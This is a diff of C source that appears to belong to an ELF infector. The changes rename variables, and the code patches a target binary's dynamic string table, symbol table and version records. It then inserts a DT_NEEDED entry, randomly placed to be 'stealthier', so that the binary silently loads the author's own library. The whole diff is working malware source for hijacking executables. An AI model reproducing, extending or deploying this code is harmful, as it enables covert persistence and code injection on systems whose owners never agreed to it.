@@ -42,47 +42,47 @@ void entry() {
   char* line = NULL;
   size_t len = 0;
   
-  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)base;
-  unsigned int elf_size = ehdr->e_shoff + (ehdr->e_shentsize * ehdr->e_shnum);
+  Elf64_Ehdr* target_ehdr = (Elf64_Ehdr*)base;
+  unsigned int target_elf_size = target_ehdr->e_shoff + (target_ehdr->e_shentsize * target_ehdr->e_shnum);
   
-  Elf64_Shdr* shdr = (Elf64_Shdr*)(base + ehdr->e_shoff);
+  Elf64_Shdr* target_shdr = (Elf64_Shdr*)(base + target_ehdr->e_shoff);
   
-  Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + base);
+  Elf64_Shdr* target_shstrtab = (Elf64_Shdr*)(((target_ehdr->e_shstrndx * target_ehdr->e_shentsize) + target_ehdr->e_shoff) + base);
   
-  char* dyn_str = NULL;
+  char* target_dynstr = NULL;
   
-  char* strtab = (char*)(base + shstrtab->sh_offset);
+  char* target_strtab = (char*)(base + target_shstrtab->sh_offset);
   
-  unsigned int dynstr_size = 0;
+  unsigned int target_dynstr_size = 0;
 
-  Elf64_Sym* dyn_sym = NULL;
-  unsigned int sym_cnt = 0;
+  Elf64_Sym* target_dynsym = NULL;
+  unsigned int target_sym_cnt = 0;
   
-  Elf64_Dyn* dynamic = NULL;
-  unsigned int dyn_cnt = 0;
+  Elf64_Dyn* target_dynamic = NULL;
+  unsigned int target_dyn_cnt = 0;
   
-  int flag = 0;
+  int target_flag = 0;
 
-  Elf64_Half* versym = NULL;
+  Elf64_Half* target_versym = NULL;
   
   // find needed sections
-  for(int i = 0; i < ehdr->e_shnum && (dyn_str == NULL || dynamic == NULL); ++i){
-    if(shdr->sh_type == SHT_GNU_versym){
-      versym = (Elf64_Half*)((char*)ehdr + shdr->sh_offset);
-    }else if(shdr->sh_type == SHT_DYNSYM && !strcmp(&strtab[shdr->sh_name], ".dynsym")){
-      dyn_sym = (Elf64_Sym*)((char*)ehdr + shdr->sh_offset);
-      sym_cnt = shdr->sh_size / sizeof(Elf64_Sym);
-    }else if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
-      dyn_str = (char*)ehdr + shdr->sh_offset;
-      dynstr_size = shdr->sh_size;
-    }else if(shdr->sh_type == SHT_DYNAMIC && !strcmp(&strtab[shdr->sh_name], ".dynamic")){
-      dynamic = (Elf64_Dyn*)((char*)ehdr + shdr->sh_offset);
-      dyn_cnt = shdr->sh_size / sizeof(Elf64_Dyn);
-      if(shdr[1].sh_offset - shdr->sh_offset >= sizeof(Elf64_Dyn)){
-        flag = 1;
+  for(int i = 0; i < target_ehdr->e_shnum && (target_dynstr == NULL || target_dynamic == NULL); ++i){
+    if(target_shdr->sh_type == SHT_GNU_versym){
+      target_versym = (Elf64_Half*)((char*)target_ehdr + target_shdr->sh_offset);
+    }else if(target_shdr->sh_type == SHT_DYNSYM && !strcmp(&target_strtab[target_shdr->sh_name], ".dynsym")){
+      target_dynsym = (Elf64_Sym*)((char*)target_ehdr + target_shdr->sh_offset);
+      target_sym_cnt = target_shdr->sh_size / sizeof(Elf64_Sym);
+    }else if(target_shdr->sh_type == SHT_STRTAB && !strcmp(&target_strtab[target_shdr->sh_name], ".dynstr")){
+      target_dynstr = (char*)target_ehdr + target_shdr->sh_offset;
+      target_dynstr_size = target_shdr->sh_size;
+    }else if(target_shdr->sh_type == SHT_DYNAMIC && !strcmp(&target_strtab[target_shdr->sh_name], ".dynamic")){
+      target_dynamic = (Elf64_Dyn*)((char*)target_ehdr + target_shdr->sh_offset);
+      target_dyn_cnt = target_shdr->sh_size / sizeof(Elf64_Dyn);
+      if(target_shdr[1].sh_offset - target_shdr->sh_offset >= sizeof(Elf64_Dyn)){
+        target_flag = 1;
       }
     }
-    shdr++;
+    target_shdr++;
   }
 
   const char *candidates[] = {
@@ -96,18 +96,18 @@ void entry() {
   int candidate_found = 0;
 
   for (int c = 0; candidates[c] != NULL && !candidate_found; c++) {
-    str = dyn_str + 1;
-    while ((str - dyn_str) < dynstr_size) {
+    str = target_dynstr + 1;
+    while ((str - target_dynstr) < target_dynstr_size) {
       if (!strcmp(str, candidates[c])) {
         candidate_found = 1;
         strcpy(str, sub); // insert substituted symbol name
         // now sub will show up in .dynsym instead of soname
         strcpy(&str[strlen(sub)+1], self);
         // find dynsym entry and patch to match a normal global symbol
-        for(unsigned int i = 0; i < sym_cnt; ++i){
-          if(dyn_sym[i].st_name == (str - dyn_str)){
-            dyn_sym[i].st_info = STB_GLOBAL << 4 | STT_FUNC;
-            dyn_sym[i].st_other = STV_DEFAULT;
+        for(unsigned int i = 0; i < target_sym_cnt; ++i){
+          if(target_dynsym[i].st_name == (str - target_dynstr)){
+            target_dynsym[i].st_info = STB_GLOBAL << 4 | STT_FUNC;
+            target_dynsym[i].st_other = STV_DEFAULT;
 
             // get libc base address from maps
             unsigned long long libc_base = 0;
@@ -156,56 +156,56 @@ void entry() {
             }
 
             // find version index for 'sub' in libc
-            unsigned int ver_ndx = VER_NDX_GLOBAL; //default: unversioned
+            unsigned int libc_ver_ndx = VER_NDX_GLOBAL; //default: unversioned
             for(int j = 1; j < libc_sym_cnt; ++j){
               if(libc_dynsym[j].st_name != 0 && !strcmp(&libc_dynstr[libc_dynsym[j].st_name], sub)){
                 // NOTE: VERSYM_HIDDEN should never be set for a chosen 'sub' symbol
                 // NOTE: VER_NDX_GLOBAL should also never be set for a chosen 'sub'
-                ver_ndx = libc_versym[j] & 0x7fff;
+                libc_ver_ndx = libc_versym[j] & 0x7fff;
                 break;
               }
             }
 
-            // assign versym[i] the version index that corresponds to the version string that ver_ndx corresponds to in libc for 'sub'
+            // assign versym[i] the version index that corresponds to the version string that libc_ver_ndx corresponds to in libc for 'sub'
 
-            // find version string for ver_ndx in libc's verdef section
-            char* ver_str = NULL;
+            // find version string for libc_ver_ndx in libc's verdef section
+            char* libc_ver_str = NULL;
 	    
-	    // reset libc shdr ptr
-            shdr = (Elf64_Shdr*)(libc + libc_ehdr->e_shoff);
+	    // find libc verdef section
+            Elf64_Shdr* libc_verdef_shdr = (Elf64_Shdr*)(libc + libc_ehdr->e_shoff);
 	    
             for(int j = 0; j < libc_ehdr->e_shnum; ++j){
-              if(shdr->sh_type == SHT_GNU_verdef && shdr->sh_size > 0){
-                Elf64_Verdef* vd = (Elf64_Verdef*)((char*)libc_ehdr + shdr->sh_offset);
+              if(libc_verdef_shdr->sh_type == SHT_GNU_verdef && libc_verdef_shdr->sh_size > 0){
+                Elf64_Verdef* vd = (Elf64_Verdef*)((char*)libc_ehdr + libc_verdef_shdr->sh_offset);
                 while(1){
-                  if(vd->vd_ndx == ver_ndx){
+                  if(vd->vd_ndx == libc_ver_ndx){
                     // found the version definition, get the version string from the first auxiliary entry
                     Elf64_Verdaux* vda = (Elf64_Verdaux*)((char*)vd + vd->vd_aux);
-                    // NOTE: ver_str is assumed will be found
-                    ver_str = &libc_dynstr[vda->vda_name];
+                    // NOTE: libc_ver_str is assumed will be found
+                    libc_ver_str = &libc_dynstr[vda->vda_name];
                     break;
                   }
                   if(vd->vd_next == 0) break;
                   vd = (Elf64_Verdef*)((char*)vd + vd->vd_next);
                 }
-                if(ver_str) break;
+                if(libc_ver_str) break;
               }
-              shdr++;
+              libc_verdef_shdr++;
             }
 
             // find target's verneed section and look for the version string
             int found = 0;
-            Elf64_Shdr* target_shdr_iter = (Elf64_Shdr*)(base + ehdr->e_shoff);
-            for(int j = 0; j < ehdr->e_shnum; ++j){
+            Elf64_Shdr* target_shdr_iter = (Elf64_Shdr*)(base + target_ehdr->e_shoff);
+            for(int j = 0; j < target_ehdr->e_shnum; ++j){
               if(target_shdr_iter->sh_type == SHT_GNU_verneed && target_shdr_iter->sh_size > 0){
-                Elf64_Verneed* vn = (Elf64_Verneed*)((char*)ehdr + target_shdr_iter->sh_offset);
+                Elf64_Verneed* vn = (Elf64_Verneed*)((char*)target_ehdr + target_shdr_iter->sh_offset);
                 while(1){
                   // iterate through vernaux entries for this verneed
                   Elf64_Vernaux* vna = (Elf64_Vernaux*)((char*)vn + vn->vn_aux);
                   for(int k = 0; k < vn->vn_cnt; ++k){
-                    if(!strcmp(&dyn_str[vna->vna_name], ver_str)){
+                    if(!strcmp(&target_dynstr[vna->vna_name], libc_ver_str)){
                       // found the version string, use the version index from vna_other
-                      versym[i] = vna->vna_other;
+                      target_versym[i] = vna->vna_other;
                       break;
                     }
                     if(vna->vna_next == 0) break;
@@ -231,30 +231,30 @@ void entry() {
   }
 
   // calculate offset for new dt_needed entry (random if more than 1 entry but bounded between first/last entry..stealthier??)
-  int needed_offset = 0;
+  int target_needed_offset = 0;
   for(int i = 0; ; ++i){
-    if(dynamic[i].d_tag != DT_NEEDED){
+    if(target_dynamic[i].d_tag != DT_NEEDED){
       srand(time(0));
-      needed_offset = i > 1 ? (rand() % (i - 1)) + 1 : 0;
+      target_needed_offset = i > 1 ? (rand() % (i - 1)) + 1 : 0;
       break;
     }
   }
   
-  // for first needed entry use dynamic + 1, dynamic, dyn_cnt * sizeof(Elf64_Dyn) i.e. needed_offset = 0
-  if(flag){
+  // for first needed entry use target_dynamic + 1, target_dynamic, target_dyn_cnt * sizeof(Elf64_Dyn) i.e. target_needed_offset = 0
+  if(target_flag){
     // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
-    memmove(dynamic + needed_offset + 1, dynamic + needed_offset, (dyn_cnt - needed_offset) * sizeof(Elf64_Dyn));
-    dynamic[needed_offset].d_tag = DT_NEEDED;
-    dynamic[needed_offset].d_un.d_val = &str[strlen(sub)+1] - dyn_str;
+    memmove(target_dynamic + target_needed_offset + 1, target_dynamic + target_needed_offset, (target_dyn_cnt - target_needed_offset) * sizeof(Elf64_Dyn));
+    target_dynamic[target_needed_offset].d_tag = DT_NEEDED;
+    target_dynamic[target_needed_offset].d_un.d_val = &str[strlen(sub)+1] - target_dynstr;
   }else{
     // loop through Dyn struct array to find dt_debug field converting dt_debug->dt_needed
-    for(int i = 0; i < dyn_cnt; ++i){
-      if(dynamic->d_tag == DT_DEBUG){
-        dynamic->d_tag = DT_NEEDED;
-        dynamic->d_un.d_val = &str[strlen(sub)+1] - dyn_str;
+    for(int i = 0; i < target_dyn_cnt; ++i){
+      if(target_dynamic->d_tag == DT_DEBUG){
+        target_dynamic->d_tag = DT_NEEDED;
+        target_dynamic->d_un.d_val = &str[strlen(sub)+1] - target_dynstr;
         break;
       }
-      dynamic++;
+      target_dynamic++;
     }
   }
   
